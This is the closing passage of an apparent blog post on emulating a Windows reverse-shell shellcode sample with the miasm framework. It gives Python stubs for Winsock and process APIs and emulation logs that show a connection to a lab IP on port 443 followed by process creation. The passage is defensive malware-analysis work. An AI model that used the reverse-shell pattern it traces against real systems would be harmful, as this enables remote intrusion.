</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;WSAStartup(wVersionRequired, lpWSAData)&#34;</span>)
</span></span><span style="display:flex;"><span>    ret_ad, args <span style="color:#f92672">=</span> jitter<span style="color:#f92672">.</span>func_args_stdcall([<span style="color:#e6db74">&#34;wVersionRequired&#34;</span>, <span style="color:#e6db74">&#34;lpWSAData&#34;</span>])
</span></span><span style="display:flex;"><span>    jitter<span style="color:#f92672">.</span>func_ret_stdcall(ret_ad, <span style="color:#ae81ff">0</span>)
</span></span></code></pre></div><p>We now get :</p>
<pre tabindex="0"><code>INFO    ]: kernel32_LoadLibrary(dllname=0x13ffe8) ret addr: 0x40109b
[WARNING ]: warning adding .dll to modulename
[WARNING ]: ws2_32.dll
WSAStartup(wVersionRequired, lpWSAData)
Traceback (most recent call last):
[SNIP]
  File &#34;/home/user/tools/malware/miasm/miasm/jitter/jitload.py&#34;, line 479, in handle_lib
    raise ValueError(&#39;unknown api&#39;, hex(jitter.pc), repr(fname))
ValueError: (&#39;unknown api&#39;, &#39;0x71ab8b6a&#39;, &#34;&#39;ws2_32_WSASocketA&#39;&#34;)
</code></pre><p>We can continue that way and implement one by one the few functions called by the shellcode:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ws2_32_WSASocketA</span>(jitter):
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    SOCKET WSAAPI WSASocketA(
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        int                 af,
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        int                 type,
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        int                 protocol,
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        LPWSAPROTOCOL_INFOA lpProtocolInfo,
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        GROUP               g,
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        DWORD               dwFlags
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    );
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    ADDRESS_FAM <span style="color:#f92672">=</span> {<span style="color:#ae81ff">2</span>: <span style="color:#e6db74">&#34;AF_INET&#34;</span>, <span style="color:#ae81ff">23</span>: <span style="color:#e6db74">&#34;AF_INET6&#34;</span>}
</span></span><span style="display:flex;"><span>    TYPES <span style="color:#f92672">=</span> {<span style="color:#ae81ff">1</span>: <span style="color:#e6db74">&#34;SOCK_STREAM&#34;</span>, <span style="color:#ae81ff">2</span>: <span style="color:#e6db74">&#34;SOCK_DGRAM&#34;</span>}
</span></span><span style="display:flex;"><span>    PROTOCOLS <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>: <span style="color:#e6db74">&#34;Whatever&#34;</span>, <span style="color:#ae81ff">6</span>: <span style="color:#e6db74">&#34;TCP&#34;</span>, <span style="color:#ae81ff">17</span>: <span style="color:#e6db74">&#34;UDP&#34;</span>}
</span></span><span style="display:flex;"><span>    ret_ad, args <span style="color:#f92672">=</span> jitter<span style="color:#f92672">.</span>func_args_stdcall([<span style="color:#e6db74">&#34;af&#34;</span>, <span style="color:#e6db74">&#34;type&#34;</span>, <span style="color:#e6db74">&#34;protocol&#34;</span>, <span style="color:#e6db74">&#34;lpProtocolInfo&#34;</span>, <span style="color:#e6db74">&#34;g&#34;</span>, <span style="color:#e6db74">&#34;dwFlags&#34;</span>])
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;WSASocketA(</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">, </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">, </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">, ...)&#34;</span><span style="color:#f92672">.</span>format(
</span></span><span style="display:flex;"><span>        ADDRESS_FAM[args<span style="color:#f92672">.</span>af],
</span></span><span style="display:flex;"><span>        TYPES[args<span style="color:#f92672">.</span>type],
</span></span><span style="display:flex;"><span>        PROTOCOLS[args<span style="color:#f92672">.</span>protocol]
</span></span><span style="display:flex;"><span>    ))
</span></span><span style="display:flex;"><span>    jitter<span style="color:#f92672">.</span>func_ret_stdcall(ret_ad, <span style="color:#ae81ff">14</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ws2_32_connect</span>(jitter):
</span></span><span style="display:flex;"><span>    ret_ad, args <span style="color:#f92672">=</span> jitter<span style="color:#f92672">.</span>func_args_stdcall([<span style="color:#e6db74">&#34;s&#34;</span>, <span style="color:#e6db74">&#34;name&#34;</span>, <span style="color:#e6db74">&#34;namelen&#34;</span>])
</span></span><span style="display:flex;"><span>    sockaddr <span style="color:#f92672">=</span> jitter<span style="color:#f92672">.</span>vm<span style="color:#f92672">.</span>get_mem(args<span style="color:#f92672">.</span>name, args<span style="color:#f92672">.</span>namelen)
</span></span><span style="display:flex;"><span>    family <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;H&#34;</span>, sockaddr[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">2</span>])[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> family <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>:
</span></span><span style="display:flex;"><span>        port <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;&gt;H&#34;</span>, sockaddr[<span style="color:#ae81ff">2</span>:<span style="color:#ae81ff">4</span>])[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>        ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.&#34;</span><span style="color:#f92672">.</span>join([str(i) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;BBBB&#34;</span>, sockaddr[<span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">8</span>])])
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;socket_connect(fd, [</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">, </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">, </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">], </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">)&#34;</span><span style="color:#f92672">.</span>format(<span style="color:#e6db74">&#34;AF_INET&#34;</span>, port, ip, args<span style="color:#f92672">.</span>namelen))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;connect()&#34;</span>)
</span></span><span style="display:flex;"><span>    jitter<span style="color:#f92672">.</span>func_ret_stdcall(ret_ad, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">kernel32_CreateProcessA</span>(jitter):
</span></span><span style="display:flex;"><span>    ret_ad, args <span style="color:#f92672">=</span> jitter<span style="color:#f92672">.</span>func_args_stdcall([<span style="color:#e6db74">&#34;lpApplicationName&#34;</span>, <span style="color:#e6db74">&#34;lpCommandLine&#34;</span>, <span style="color:#e6db74">&#34;lpProcessAttributes&#34;</span>, <span style="color:#e6db74">&#34;lpThreadAttributes&#34;</span>, <span style="color:#e6db74">&#34;bInheritHandles&#34;</span>, <span style="color:#e6db74">&#34;dwCreationFlags&#34;</span>, <span style="color:#e6db74">&#34;lpEnvironment&#34;</span>, <span style="color:#e6db74">&#34;lpCurrentDirectory&#34;</span>, <span style="color:#e6db74">&#34;lpStartupInfo&#34;</span>, <span style="color:#e6db74">&#34;lpProcessInformation&#34;</span>])
</span></span><span style="display:flex;"><span>    jitter<span style="color:#f92672">.</span>func_ret_stdcall(ret_ad, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">kernel32_ExitProcess</span>(jitter):
</span></span><span style="display:flex;"><span>    ret_ad, args <span style="color:#f92672">=</span> jitter<span style="color:#f92672">.</span>func_args_stdcall([<span style="color:#e6db74">&#34;uExitCode&#34;</span>])
</span></span><span style="display:flex;"><span>    jitter<span style="color:#f92672">.</span>func_ret_stdcall(ret_ad, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    jitter<span style="color:#f92672">.</span>run <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
</span></span></code></pre></div><p>And finally we get a full emulation of the shellcode :</p>
<pre tabindex="0"><code>[INFO    ]: Add module 400000 &#39;sc_windows1.exe&#39;
[INFO    ]: Add module 7c900000 &#39;ntdll.dll&#39;
[INFO    ]: Add module 7c800000 &#39;kernel32.dll&#39;
[INFO    ]: Add module 7e410000 &#39;user32.dll&#39;
[INFO    ]: Add module 774e0000 &#39;ole32.dll&#39;
[INFO    ]: Add module 7e1e0000 &#39;urlmon.dll&#39;
[INFO    ]: Add module 71ab0000 &#39;ws2_32.dll&#39;
[INFO    ]: Add module 77dd0000 &#39;advapi32.dll&#39;
[INFO    ]: Add module 76bf0000 &#39;psapi.dll&#39;
[INFO    ]: kernel32_LoadLibrary(dllname=0x13ffe8) ret addr: 0x40109b
[WARNING ]: warning adding .dll to modulename
[WARNING ]: ws2_32.dll
WSAStartup(wVersionRequired, lpWSAData)
[INFO    ]: ws2_32_WSAStartup(wVersionRequired=0x190, lpWSAData=0x13fe58) ret addr: 0x4010ab
[INFO    ]: ws2_32_WSASocketA(af=0x2, type=0x1, protocol=0x0, lpProtocolInfo=0x0, g=0x0, dwFlags=0x0) ret addr: 0x4010ba
WSASocketA(AF_INET, SOCK_STREAM, Whatever, ...)
[INFO    ]: ws2_32_connect(s=0xe, name=0x13fe4c, namelen=0x10) ret addr: 0x4010d4
socket_connect(fd, [AF_INET, 443, 192.168.56.1], 16)
[INFO    ]: kernel32_CreateProcessA(lpApplicationName=0x0, lpCommandLine=0x13fe48, lpProcessAttributes=0x0, lpThreadAttributes=0x0, bInheritHandles=0x1, dwCreationFlags=0x0, lpEnvironment=0x0, lpCurrentDirectory=0x0, lpStartupInfo=0x13fe04, lpProcessInformation=0x13fdf4) ret addr: 0x401117
[INFO    ]: kernel32_WaitForSingleObject(handle=0x0, dwms=0xffffffff) ret addr: 0x401125
[INFO    ]: kernel32_GetVersion() ret addr: 0x401131
[INFO    ]: kernel32_ExitProcess(uExitCode=0x0) ret addr: 0x401144
</code></pre><h2 id="so-long-and-thanks-for-all-the-fish">So Long, and Thanks for All the Fish<a class="anchor" href="#so-long-and-thanks-for-all-the-fish">#</a></h2>
<p>It was fun to learn miasm and I find it very powerful (I have not even explored the symbolic execution yet). It is not the only tool doing that (<a href="https://triton.quarkslab.com/">triton</a> for instance is doing pretty much the same thing) but I found miasm well written and with a lot of features. The only drawback is the lack of documentation for now. If you want to start using miasm, you should have a look at <a href="https://github.com/cea-sec/miasm/tree/master/example">the examples</a> and the <a href="https://miasm.re/blog/">blog posts</a>, they are good starting points. Willi Ballenthin has also written a few <a href="http://www.williballenthin.com/post/2020-01-09-miasm-part-1/">blog</a> <a href="http://www.williballenthin.com/post/2020-01-12-miasm-part-2/">posts</a> recently that I found interesting. And once you know the bits and pieces of it, <a href="https://github.com/cea-sec/miasm/issues/1167">join me to create a good documentation</a>.</p>
<p>Stay home and take care !</p>
<p>This blog post was written while listening to <a href="https://kiasmos.bandcamp.com/album/kiasmos">Kiasmos</a>.</p>


              
          </article>
          

<ul class="tags__list">
    
    <li class="tag__item">
        <a class="tag__link" href="https://maynier.eu/tags/security/">security</a>
    </li>
    <li class="tag__item">
        <a class="tag__link" href="https://maynier.eu/tags/malware/">malware</a>
    </li>
    <li class="tag__item">
        <a class="tag__link" href="https://maynier.eu/tags/reverse/">reverse</a>
    </li></ul>

 <div class="pagination">
  
    <a class="pagination__item" href="https://maynier.eu/blog/2019/12/02/targeted-attacks-against-civil-society-what-is-new-in-2019/">
        <span class="pagination__label">Previous Post</span>
        <span class="pagination__title">Targeted Attacks Against Civil Society : What is New in 2019?</span>
    </a>
  

  
    <a class="pagination__item" href="https://maynier.eu/blog/2020/08/23/some-thoughts-about-stalkerware-and-technology-in-intimate-partner-violence/">
      <span class="pagination__label">Next Post</span>
      <span class="pagination__title" >Some Thoughts About Stalkerware and Technology in Intimate Partner Violence</a>
    </a>
  
</div>

          
          <footer class="post__footer">
            


<div class="social-icons">
  
    
    
  
    
    
      <a class="social-icons__icon" title="Mastodon"
         style="background-image: url(/images/social/mastodon.svg)"
         href="https://todon.eu/@tek"
         target="_blank" rel="noopener">
      </a>
    
  
    
    
      <a class="social-icons__icon" title="BlueSky"
         style="background-image: url(/images/social/bluesky.svg)"
         href="https://bsky.app/profile/tek.randhome.io"
         target="_blank" rel="noopener">
      </a>
    
  
    
    
      <a class="social-icons__icon" title="GitHub"
         style="background-image: url(/images/social/github.svg)"
         href="https://github.com/Te-k"
         target="_blank" rel="noopener">
      </a>
    
  
    
    
  
    
    
  
    
    
  
    
    
  
    
    
  
    
    
      <a class="social-icons__icon" title="Rss"
         style="background-image: url(/images/social/rss.svg)"
         href="/index.xml"
         target="_blank" rel="noopener">
      </a>
    
  
    
    
      <a class="social-icons__icon" title="Email"
         style="background-image: url(/images/social/email.svg)"
         href="mailto:etienne@maynier.eu"
         target="_blank" rel="noopener">
      </a>
    
  
</div>

            <p>© 2025</p>
          </footer>
          </div>
      </div>
      
    </div>


  </main>

   

  
  <script src="/js/index.min.301a8b0870381bf76b3b5182e8966d363a0474281183439beb024d8b8228fc66.js" integrity="sha256-MBqLCHA4G/drO1GC6JZtNjoEdCgRg0Ob6wJNi4Io/GY=" crossorigin="anonymous"></script>
  
  


</body>

</html>
